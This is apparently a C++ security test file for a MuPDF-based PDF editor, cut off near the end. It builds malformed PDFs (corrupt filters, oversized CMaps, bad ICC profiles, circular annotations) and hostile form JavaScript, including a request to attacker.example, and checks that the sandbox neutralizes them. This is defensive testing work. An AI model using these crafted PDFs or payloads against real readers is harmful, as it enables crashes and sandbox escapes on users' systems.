// -*- coding: utf-8 -*-
//
// Advanced malicious PDF tests — covers the gaps identified in the
// second-pass security audit: filter coverage, ToUnicode CMap injection,
// ICC profile parsing, recursive annotations, linearization tampering,
// encryption downgrade, optional content groups, expanded JS API surface,
// transparency/shading, embedded file bombs, and upstream MuPDF
// integration edge cases.

#include <gtest/gtest.h>
#include <cstdlib>

#include "core/Document.h"
#include "core/MuPdfContext.h"
#include "core/FormXObjectDepthGuard.h"

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>
#endif

#include "core/Page.h"
#include "encryption/EncryptionManager.h"
#include "forms/FormManager.h"
#include "forms/JavaScriptEngine.h"
#include "attachments/AttachmentManager.h"

#include "security_oracles.h"

#include <QRectF>

#include <chrono>
#include <filesystem>
#include <fstream>
#include <memory>
#include <ios>
#include <sstream>
#include <string>
#include <vector>

using namespace pdfe::core;

namespace {

std::string fixturesDir() { return std::string(TEST_FIXTURES_DIR); }

// SEC-44 helpers: hand a hostile payload a real target path.

void substituteAll(std::string& s, std::string_view token,
                   const std::string& with)
{
    for (std::size_t p = s.find(token); p != std::string::npos;
         p = s.find(token, p + with.size())) {
        s.replace(p, token.size(), with);
    }
}

// A Windows path inside a JS string literal must survive both the PDF
// tokenizer and MuJS. Backslashes are the whole problem: "C:\x" is an escape
// in JS, so an unescaped path would make the payload a SYNTAX ERROR and the
// test would pass because nothing ran — the classic way a hostile-input test
// becomes decoration.
std::string jsEscape(const std::string& in)
{
    std::string out;
    out.reserve(in.size() * 2);
    for (char c : in) {
        if (c == '\\' || c == '\'' || c == '"') out.push_back('\\');
        out.push_back(c);
    }
    return out;
}

// -- Real JS-sandbox oracle (shared with JsSandboxRealOracle) -------------
// Fire the js_sandbox_probe.pdf Format action and return "name=typeof|..."
// so callers can assert the dangerous Acrobat escape APIs are `undefined`.
std::string runSandboxProbeString()
{
    auto ctx = std::make_shared<MuPdfContext>();
    auto fx = std::filesystem::path(fixturesDir()) / "js_sandbox_probe.pdf";
    if (!std::filesystem::exists(fx)) return "";
    auto doc = Document::open(ctx, fx);
    if (!doc) return "";
    auto page = doc->page(0);
    if (!page) return "";
    pdfe::forms::JavaScriptEngine engine(ctx);
    engine.enable(page.get());
    return engine.fireFormatEvent(page.get(), 0);
}

std::string probeApiType(const std::string& probe, const std::string& api)
{
    const std::string key = api + "=";
    auto p = probe.find(key);
    if (p == std::string::npos) return "";
    auto start = p + key.size();
    auto end = probe.find('|', start);
    return probe.substr(start,
        end == std::string::npos ? std::string::npos : end - start);
}

std::filesystem::path tempDir()
{
    auto d = std::filesystem::temp_directory_path() / "pdfe_mal_adv";
    std::filesystem::create_directories(d);
    return d;
}

void writePdf(const std::filesystem::path& path, const std::string& content)
{
    std::ofstream f(path, std::ios::binary | std::ios::trunc);
    f.write(content.data(), static_cast<std::streamsize>(content.size()));
}

} // namespace

class MaliciousPdfAdvancedTest : public ::testing::Test {
protected:
    void SetUp() override {
        ctx_ = std::make_shared<MuPdfContext>();
        td_ = tempDir();
    }
    std::shared_ptr<MuPdfContext> ctx_;
    std::filesystem::path td_;
};

// =====================================================================
// 1. FILTER COVERAGE — LZW, RunLength, CCITTFax, ASCII85, ASCIIHex
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, LzwDecodeMalformedStreamHandled)
{
    // LZW stream with garbage bytes — MuPDF should detect and recover
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length 10 /Filter /LZWDecode >>\nstream\n"
        "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\n"
        "endstream\nendobj\n"
        "xref\n0 5\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "lzw_malformed.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Malformed LZW stream must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, RunLengthDecodeMalformedHandled)
{
    // RunLength encoding with invalid byte sequence
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length 5 /Filter /RunLengthDecode >>\nstream\n"
        "\x80\x80\x80\x80\x80\n"
        "endstream\nendobj\n"
        "xref\n0 5\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "runlength_malformed.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Malformed RunLength stream must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, Ascii85DecodeMalformedHandled)
{
    // ASCII85 with invalid characters (must be in 33..117 range)
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length 5 /Filter /ASCII85Decode >>\nstream\n"
        "\x01\x02\x03~>\n"
        "endstream\nendobj\n"
        "xref\n0 5\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "ascii85_malformed.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Malformed ASCII85 stream must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, CcittFaxDecodeMalformedHandled)
{
    // CCITTFax for monochrome scan — invalid params trigger MuPDF decoder
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R /Resources << /XObject << /Im0 5 0 R >> >> >>\n"
        "endobj\n"
        "4 0 obj\n<< /Length 20 >>\nstream\n"
        "q 100 0 0 100 50 650 cm /Im0 Do Q\n"
        "endstream\nendobj\n"
        "5 0 obj\n<< /Type /XObject /Subtype /Image /Width 100 /Height 100 "
        "/ColorSpace /DeviceGray /BitsPerComponent 1 /Filter /CCITTFaxDecode "
        "/DecodeParms << /K -1 /Columns 100 /Rows 100 >> "
        "/Length 4 >>\nstream\n\xFF\xFF\xFF\xFF\n"
        "endstream\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000300 00000 n \n"
        "0000000400 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "ccittfax_malformed.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Malformed CCITTFax image must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, AsciiHexDecodeMalformedHandled)
{
    // ASCIIHex with non-hex characters
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length 5 /Filter /ASCIIHexDecode >>\nstream\n"
        "XYZ!>\n"
        "endstream\nendobj\n"
        "xref\n0 5\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "asciihex_malformed.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Malformed ASCIIHex stream must not crash";
}

// =====================================================================
// 2. ToUnicode CMap injection — oversized + malformed mappings
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, OversizedToUnicodeCmapHandled)
{
    // Build a ToUnicode CMap with many bfchar entries — tests upstream
    // MuPDF CMap parser's bounds checking for large mapping tables.
    std::string bfchars;
    for (int i = 0; i < 5000; ++i) {
        char buf[32];
        std::snprintf(buf, sizeof(buf), "<%04X> <%04X>\n", i, i + 0x4E00);
        bfchars += buf;
    }
    std::string cmap =
        "/CIDInit /ProcSet findresource begin\n"
        "12 dict begin\nbegincmap\n"
        "/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def\n"
        "/CMapName /Adobe-Identity-UCS def\n/CMapType 2 def\n"
        "1 begincodespacerange <0000> <FFFF> endcodespacerange\n"
        "5000 beginbfchar\n" + bfchars + "endbfchar\nendcmap\n"
        "CMapName currentdict /CMap defineresource pop\nend\nend\n";

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /Font << /F1 4 0 R >> >> /Contents 6 0 R >>\nendobj\n"
        "4 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /Test "
        "/Encoding /Identity-H /DescendantFonts [5 0 R] /ToUnicode 7 0 R "
        ">>\nendobj\n"
        "5 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Test "
        "/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) "
        "/Supplement 0 >> /CIDToGIDMap /Identity >>\nendobj\n"
        "6 0 obj\n<< /Length 30 >>\nstream\n"
        "BT /F1 12 Tf 100 700 Td (test) Tj ET\nendstream\nendobj\n"
        "7 0 obj\n<< /Length " + std::to_string(cmap.size()) +
        " >>\nstream\n" + cmap + "\nendstream\nendobj\n"
        "xref\n0 8\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000300 00000 n \n"
        "0000000450 00000 n \n0000000600 00000 n \n"
        "0000000700 00000 n \n"
        "trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "oversized_tounicode.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Oversized ToUnicode CMap (5000 entries) must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, MalformedToUnicodeCmapHandled)
{
    // CMap with invalid syntax — tests MuPDF CMap parser recovery
    std::string cmap =
        "/CIDInit /ProcSet findresource begin\n"
        "begincmap\nbegincodespacerange\n<00> <FF>\n"
        "endcodespacerange\n"
        "INVALID_KEYWORD bfchar\n<00> <0041>\nendbfchar\n"
        "endcmap\nend\n";

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 "
        "/BaseFont /Helvetica /ToUnicode 4 0 R >> >> >> /Contents 5 0 R "
        ">>\nendobj\n"
        "4 0 obj\n<< /Length " + std::to_string(cmap.size()) +
        " >>\nstream\n" + cmap + "\nendstream\nendobj\n"
        "5 0 obj\n<< /Length 30 >>\nstream\n"
        "BT /F1 12 Tf 100 700 Td (test) Tj ET\nendstream\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000300 00000 n \n"
        "0000000500 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "malformed_tounicode.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Malformed ToUnicode CMap must not crash";
}

// =====================================================================
// 3. ICC profile parsing — truncated and oversized profiles
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, TruncatedIccProfileHandled)
{
    // Truncated ICC profile header (real ICC headers are 128 bytes;
    // this is just 16 bytes claiming to be ICC).
    std::string iccHeader(16, '\x00');
    iccHeader[8] = 0x04;  // version 4
    iccHeader[12] = 'm'; iccHeader[13] = 'n'; iccHeader[14] = 't';
    iccHeader[15] = 'r';  // class: display

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /ColorSpace << /CS0 [/ICCBased 4 0 R] >> >> "
        "/Contents 5 0 R >>\nendobj\n"
        "4 0 obj\n<< /N 3 /Alternate /DeviceRGB /Length " +
        std::to_string(iccHeader.size()) + " >>\nstream\n" + iccHeader +
        "\nendstream\nendobj\n"
        "5 0 obj\n<< /Length 30 >>\nstream\n"
        "q /CS0 cs 0.5 0.5 0.5 sc 100 100 50 50 re f Q\nendstream\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000300 00000 n \n"
        "0000000500 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "truncated_icc.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Truncated ICC profile must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, InvalidIccColorComponentCount)
{
    // ICC profile claims N=99 components (invalid; max practical is 15)
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /ColorSpace << /CS0 [/ICCBased 4 0 R] >> >> "
        "/Contents 5 0 R >>\nendobj\n"
        "4 0 obj\n<< /N 99 /Alternate /DeviceRGB /Length 4 >>\n"
        "stream\nABCD\nendstream\nendobj\n"
        "5 0 obj\n<< /Length 60 >>\nstream\n"
        "/CS0 cs 0.5 0.5 0.5 sc 100 100 50 50 re f\nendstream\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000300 00000 n \n"
        "0000000450 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "invalid_icc_n.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Invalid ICC component count must not crash";
}

// =====================================================================
// 4. Recursive Popup annotations — circular references
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, RecursivePopupAnnotationHandled)
{
    // Annot 4 has /Popup -> 5, Annot 5 has /Popup -> 4 (circular)
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Annots [4 0 R 5 0 R] >>\nendobj\n"
        "4 0 obj\n<< /Type /Annot /Subtype /Text /Rect [100 100 120 120] "
        "/Contents (parent) /Popup 5 0 R >>\nendobj\n"
        "5 0 obj\n<< /Type /Annot /Subtype /Popup /Rect [200 200 300 300] "
        "/Parent 4 0 R /Popup 4 0 R >>\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000230 00000 n \n"
        "0000000350 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "recursive_popup.pdf";
    writePdf(path, pdf);

    auto start = std::chrono::steady_clock::now();
    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto page = doc->page(0);
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Recursive Popup annotation must not crash";

    auto elapsed = std::chrono::steady_clock::now() - start;
    double sec = std::chrono::duration<double>(elapsed).count();
    EXPECT_LT(sec, 5.0)
        << "Recursive Popup must not cause infinite loop (took " << sec << "s)";
}

// =====================================================================
// 5. Linearization tampering — corrupt /Linearized hints
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, CorruptedLinearizationHintsHandled)
{
    // /Linearized dict with invalid byte offsets pointing past EOF
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Linearized 1 /L 999999999 /O 3 /E 9999 /N 1 "
        "/T 999999999 /H [9999 9999] >>\nendobj\n"
        "2 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n"
        "3 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n"
        "4 0 obj\n<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] "
        ">>\nendobj\n"
        "xref\n0 5\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000100 00000 n \n"
        "0000000150 00000 n \n0000000200 00000 n \n"
        "trailer\n<< /Size 5 /Root 2 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "corrupt_linearization.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto page = doc->page(0);
        }
    }) << "Corrupted linearization hints must not crash";
}

// =====================================================================
// 6. Encryption downgrade and null-password attacks
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, EncryptedPdfWithoutPasswordRejected)
{
    auto fixture = std::filesystem::path(fixturesDir()) / "test_encrypted_aes256.pdf";
    if (!std::filesystem::exists(fixture)) GTEST_SKIP() << "fixture missing";

    // Opening encrypted PDF without password should throw — verify the
    // exception message indicates a password is required.
    bool threw = false;
    std::string what;
    try {
        auto doc = Document::open(ctx_, fixture);
    } catch (const std::exception& e) {
        threw = true;
        what = e.what();
    }
    EXPECT_TRUE(threw) << "Open without password must throw";
    if (threw) {
        EXPECT_NE(what.find("assword"), std::string::npos)
            << "Exception should mention password: " << what;
    }
}

TEST_F(MaliciousPdfAdvancedTest, EmptyStringPasswordRejectedSameAsNoPassword)
{
    auto fixture = std::filesystem::path(fixturesDir()) / "test_encrypted_aes256.pdf";
    if (!std::filesystem::exists(fixture)) GTEST_SKIP() << "fixture missing";

    // Passing "" must throw — must NOT silently bypass auth.
    bool threw = false;
    try {
        auto doc = Document::open(ctx_, fixture, "");
    } catch (const std::exception&) {
        threw = true;
    }
    EXPECT_TRUE(threw)
        << "Empty string password must not bypass encryption auth";
}

TEST_F(MaliciousPdfAdvancedTest, CorrectPasswordOpensAndDocIsEncrypted)
{
    auto fixture = std::filesystem::path(fixturesDir()) / "test_encrypted_aes256.pdf";
    if (!std::filesystem::exists(fixture)) GTEST_SKIP() << "fixture missing";

    // After successful auth, isEncrypted must remain true so permissions
    // are still enforced.
    auto doc = Document::open(ctx_, fixture, "test123");
    ASSERT_NE(doc, nullptr) << "Correct password must open the document";

    pdfe::encryption::EncryptionManager mgr(ctx_);
    auto info = mgr.getEncryptionInfo(doc.get());
    EXPECT_TRUE(info.isEncrypted);
    EXPECT_FALSE(info.method.empty());
}

TEST_F(MaliciousPdfAdvancedTest, WrongPasswordRejected)
{
    auto fixture = std::filesystem::path(fixturesDir()) / "test_encrypted_aes256.pdf";
    if (!std::filesystem::exists(fixture)) GTEST_SKIP() << "fixture missing";

    EXPECT_THROW({
        auto doc = Document::open(ctx_, fixture, "wrong_password_xyz");
        // If doc is non-null, we should still not have full access
        if (doc) {
            // Try to access content — should fail or doc should be encrypted
            (void)doc->pageCount();
        }
    }, std::exception) << "Wrong password must be rejected";
}

// =====================================================================
// 7. Optional content groups (OCG) — layer-hidden content
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, OptionalContentGroupHandled)
{
    // PDF with content in an OCG that's hidden by default
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
        "/OCProperties << /OCGs [4 0 R] /D << /Order [4 0 R] "
        "/OFF [4 0 R] >> >> >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /Properties << /OC1 4 0 R >> "
        "/Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica "
        ">> >> >> /Contents 5 0 R >>\nendobj\n"
        "4 0 obj\n<< /Type /OCG /Name (Hidden Layer) >>\nendobj\n"
        "5 0 obj\n<< /Length 80 >>\nstream\n"
        "/OC /OC1 BDC BT /F1 12 Tf 100 700 Td (SECRET LAYER DATA) Tj ET EMC\n"
        "endstream\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000158 00000 n \n"
        "0000000215 00000 n \n0000000400 00000 n \n"
        "0000000450 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "ocg_hidden_layer.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Optional content group hidden layer must not crash";
}

// =====================================================================
// 8. Full JS API surface — additional hostile APIs
// =====================================================================

// =====================================================================
// JS API surface — real evaluation via /AA /K /JS keystroke actions.
//
// Each test builds a PDF with a text field whose /AA /K (keystroke
// action) contains the hostile JavaScript. fireKeystrokeEvent triggers
// MuJS to evaluate the embedded script. If the JS engine actually
// executed the dangerous API, side effects would be observable; if
// the sandbox blocks it (undefined / no-op), the event completes
// silently. Either way, we exercise the JS evaluation path, not the
// no-op "no /AA" path used by the prior theatrical tests.
// =====================================================================

namespace {

// Build a minimal form PDF with one text field whose /AA /K /JS is
// the supplied script. The field is named "F" and is at index 0.
std::string buildPdfWithKeystrokeJs(const std::string& js)
{
    // Escape parentheses and backslashes in the JS for PDF string literals
    std::string escaped;
    escaped.reserve(js.size() * 2);
    for (char c : js) {
        if (c == '(' || c == ')' || c == '\\') escaped += '\\';
        escaped += c;
    }

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm "
        "<< /Fields [4 0 R] /NeedAppearances true >> >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Annots [4 0 R] >>\nendobj\n"
        "4 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /T (F) "
        "/Rect [100 100 300 130] /P 3 0 R "
        "/AA << /K << /S /JavaScript /JS (" + escaped + ") >> >> "
        ">>\nendobj\n"
        "xref\n0 5\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000110 00000 n \n"
        "0000000167 00000 n \n0000000260 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";
    return pdf;
}

} // namespace

class JsApiSurfaceTest : public ::testing::Test {
protected:
    void SetUp() override {
        ctx_ = std::make_shared<MuPdfContext>();
        td_ = tempDir();
        engine_ = std::make_unique<pdfe::forms::JavaScriptEngine>(ctx_);
    }

    // Build, open, and fire keystroke on a PDF whose widget 0 has /AA/K JS
    //
    // `js` may contain the token {{TARGET}}; it is replaced with an absolute
    // path inside the guarded scratch tree, and a JS-escaped one — the payload
    // gets a real, writable, watched location rather than a path it has to
    // guess. That matters: a payload aimed somewhere unwritable would be
    // stopped by the filesystem rather than by the sandbox, and the test would
    // pass for the wrong reason.
    void runHostileJs(const std::string& js, const char* tag)
    {
        // SEC-44: a scratch tree only this test knows about, holding a canary
        // whose deletion or truncation is as much a violation as a new file.
        const std::string marker = std::string("pdfe_sec44_") + tag;
        const std::filesystem::path scratch = td_ / ("sec44_" + std::string(tag));
        // Cleared, not merely created: %TEMP% survives between runs, and a
        // file left by a previous run turns "a file appeared" into "a file
        // changed". The guard reports both, but only one of them is the
        // property under test.
        std::error_code scratchEc;
        std::filesystem::remove_all(scratch, scratchEc);
        std::filesystem::create_directories(scratch, scratchEc);
        {
            std::ofstream canary(scratch / "canary.txt", std::ios::binary);
            canary << "do-not-touch";
        }

        const std::filesystem::path target = scratch / (marker + ".txt");
        std::string payload = js;
        substituteAll(payload, "{{TARGET}}", jsEscape(target.string()));

        auto path = td_ / (std::string("js_") + tag + ".pdf");
        writePdf(path, buildPdfWithKeystrokeJs(payload));
        doc_ = Document::open(ctx_, path);
        ASSERT_NE(doc_, nullptr);
        page_ = doc_->page(0);
        ASSERT_NE(page_, nullptr);
        engine_->enable(page_.get());

        pdfe::forms::FormManager fm(ctx_);
        ASSERT_FALSE(fm.getFormFields(page_.get()).empty())
            << "Test PDF must have at least one form field";

        // Positive-neutralization oracle (R-01): snapshot attack processes
        // BEFORE firing the hostile JS. A Launch/openDoc payload that actually
        // executed would spawn one; a neutralized one leaves the set unchanged.
        pdfe_test::ProcessSpawnGuard spawnGuard;

        // SEC-44: the other half of "neutralized". A payload that writes a
        // file spawns nothing, so the guard above cannot see it, and
        // EXPECT_NO_THROW below is satisfied by a payload that SUCCEEDED.
        pdfe_test::FileWriteGuard writeGuard(scratch, marker);

        // This fires the /AA/K JS action — MuJS evaluates the embedded
        // script. If sandbox blocks the API, MuJS throws internally and
        // the C++ wrapper returns; if it executes, side effects may fire.
        EXPECT_NO_THROW({
            engine_->fireKeystrokeEvent(page_.get(), 0, "", "x", 0, 0, false);
        });

        // No child process may have been spawned by the hostile script.
        EXPECT_EQ(spawnGuard.newlySpawned(), "")
            << "R-01: hostile form JS spawned a child process ('"
            << spawnGuard.newlySpawned() << "') — NOT neutralized";

        // SEC-44: nor may it have touched the filesystem — created, modified
        // or deleted. The canary covers the deletion case; without it a
        // payload that wiped the tree would read as clean.
        EXPECT_EQ(writeGuard.violation(), "")
            << "SEC-44: hostile form JS reached the filesystem — "
            << writeGuard.violation() << " — NOT neutralized";

        // PDFE must still be alive after the JS executed
        EXPECT_NO_THROW(doc_->pageCount());
    }

    std::shared_ptr<MuPdfContext> ctx_;
    std::filesystem::path td_;
    std::unique_ptr<pdfe::forms::JavaScriptEngine> engine_;
    std::unique_ptr<Document> doc_;
    std::unique_ptr<Page> page_;
};

TEST_F(JsApiSurfaceTest, AppAlertEvaluated)
{
    runHostileJs("app.alert('xss attempt')", "app_alert");
}

TEST_F(JsApiSurfaceTest, AppBeepEvaluated)
{
    runHostileJs("app.beep(0)", "app_beep");
}

TEST_F(JsApiSurfaceTest, XmlHttpRequestRejected)
{
    // If XMLHttpRequest were available, this would throw inside MuJS
    // and fireKeystrokeEvent would silently swallow it. The test
    // verifies the document remains usable — i.e. no crash, no hang,
    // no successful network call (which can't happen since MuJS has
    // no HTTP transport).
    runHostileJs(
        "try { var x = new XMLHttpRequest(); "
        "x.open('GET', 'http://attacker.example/'); x.send(); } "
